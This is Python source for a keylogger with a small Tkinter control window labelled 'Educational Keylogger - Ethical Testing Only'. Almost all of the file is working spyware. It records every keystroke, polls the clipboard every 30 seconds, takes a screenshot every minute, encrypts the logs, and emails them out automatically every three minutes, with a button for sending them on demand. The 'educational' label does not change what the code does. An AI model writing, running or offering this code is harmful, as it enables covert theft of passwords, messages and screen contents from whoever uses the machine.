import os
import time
import threading
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import pyperclip
from PIL import ImageGrab
from encrypt_util import encrypt_message
from email_util import send_email

LOG_DIR = "logs"
SCREENSHOT_DIR = "screenshots"
LOG_FILE = os.path.join(LOG_DIR, "log.txt")

os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

buffer = ""
logger_running = False
threads = []

def write_log(data):
    encrypted = encrypt_message(data)
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted + b"\n")

def on_press(key):
    global buffer
    if not logger_running:
        return
    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
        else:
            buffer += f"[{key.name}]"

    if len(buffer) >= 10:
        write_log(buffer)
        buffer = ""

def log_clipboard():
    while logger_running:
        try:
            content = pyperclip.paste()
            write_log(f"\n[CLIPBOARD]: {content}\n")
        except:
            pass
        time.sleep(30)

def capture_screenshots():
    count = 0
    while logger_running:
        screenshot = ImageGrab.grab()
        screenshot.save(f"{SCREENSHOT_DIR}/screenshot_{count}.png")
        count += 1
        time.sleep(60)

def email_logs():
    while logger_running:
        time.sleep(180)
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            print("📤 Sending auto email with log.txt...")
            send_email("Keylogger Report", "Attached is the encrypted log file.", [LOG_FILE])

def start_logger():
    global logger_running, threads
    logger_running = True
    threads = [
        threading.Thread(target=log_clipboard, daemon=True),
        threading.Thread(target=capture_screenshots, daemon=True),
        threading.Thread(target=email_logs, daemon=True),
        threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).run(), daemon=True)
    ]
    for t in threads:
        t.start()
    messagebox.showinfo("Logger", "Keylogger started!")

def stop_logger():
    global logger_running
    logger_running = False
    messagebox.showinfo("Logger", "Keylogger stopped!")

def build_gui():
    window = tk.Tk()
    window.title("Educational Keylogger")
    window.geometry("300x200")
    window.resizable(False, False)

    label = tk.Label(window, text="Keylogger - Ethical Testing Only", fg="red")
    label.pack(pady=10)

    start_btn = tk.Button(window, text="Start Logger", command=start_logger, bg="green", fg="white")
    start_btn.pack(pady=5)

    stop_btn = tk.Button(window, text="Stop Logger", command=stop_logger, bg="red", fg="white")
    stop_btn.pack(pady=5)

    send_btn = tk.Button(window, text="Send Log Now", command=lambda: send_email("Manual Log", "Sending now.", [LOG_FILE]), bg="blue", fg="white")
    send_btn.pack(pady=5)

    window.mainloop()

if __name__ == "__main__":
    build_gui()
